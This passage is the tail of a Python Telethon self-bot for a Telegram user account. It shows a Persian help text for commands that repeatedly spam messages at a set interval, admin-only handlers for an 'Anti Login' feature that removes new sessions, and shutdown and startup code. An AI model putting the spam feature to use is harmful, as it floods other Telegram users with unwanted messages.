برای اسپم متن یا با ریپلای روی پیام/فایل/استیکر

<code>stimer [عدد]</code>  
تنظیم فاصله زمانی بین پیام‌های اسپم (به ثانیه)

<code>spstop</code>  
توقف اسپم در حال اجرا
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
"""
    await safe_reply(event, help_text, parse_mode="html")

# ----------------------------
# New Commands for Anti Login Feature
# ----------------------------
@client.on(events.NewMessage(pattern=re.compile(r'^allowcurrent$', re.IGNORECASE)))
async def allow_current(event):
    if not is_admin(event.sender_id):
        return
    try:
        auths = await client(GetAuthorizationsRequest())
        # Store hashes instead of ids
        for auth in auths.authorizations:
            allowed_sessions.add(auth.hash)  # Use hash instead of id
        await safe_reply(event, "➔ Current sessions allowed. They won't be removed by Anti Login.")
    except Exception as e:
        await safe_reply(event, f"Error while allowing current sessions: {str(e)}")

@client.on(events.NewMessage(pattern=re.compile(r'^antilogin on$', re.IGNORECASE)))
async def anti_login_on(event):
    if not is_admin(event.sender_id):
        return
    global anti_login_enabled, anti_login_task
    anti_login_enabled = True
    if not anti_login_task or anti_login_task.done():
        anti_login_task = asyncio.create_task(anti_login_monitor())
    await safe_reply(event, "➔ Anti Login enabled. New sessions (except allowed ones) will be removed automatically.")

@client.on(events.NewMessage(pattern=re.compile(r'^antilogin off$', re.IGNORECASE)))
async def anti_login_off(event):
    if not is_admin(event.sender_id):
        return
    global anti_login_enabled, anti_login_task
    anti_login_enabled = False
    if anti_login_task and not anti_login_task.done():
        anti_login_task.cancel()
    await safe_reply(event, "➔ Anti Login disabled.")

# ----------------------------
# Shutdown Function
# ----------------------------
async def shutdown():
    global anti_login_task
    # لغو تسک Anti Login در صورت فعال بودن
    if anti_login_task and not anti_login_task.done():
        anti_login_task.cancel()
    # لغو تسک تایمر در صورت فعال بودن
    global timer_task
    if timer_task and not timer_task.done():
        timer_task.cancel()
    # قطع اتصال از Telethon
    await client.disconnect()
    print("🚪 Bot shutdown completed.")

# ----------------------------
# Run the bot
# ----------------------------
async def main():
    await client.start(phone=PHONE_NUMBER)
    print("🚀 Bot started!")
    await client.run_until_disconnected()

if __name__ == "__main__":
    try:
        with client:
            client.loop.run_until_complete(main())
    except KeyboardInterrupt:
        client.loop.run_until_complete(shutdown())
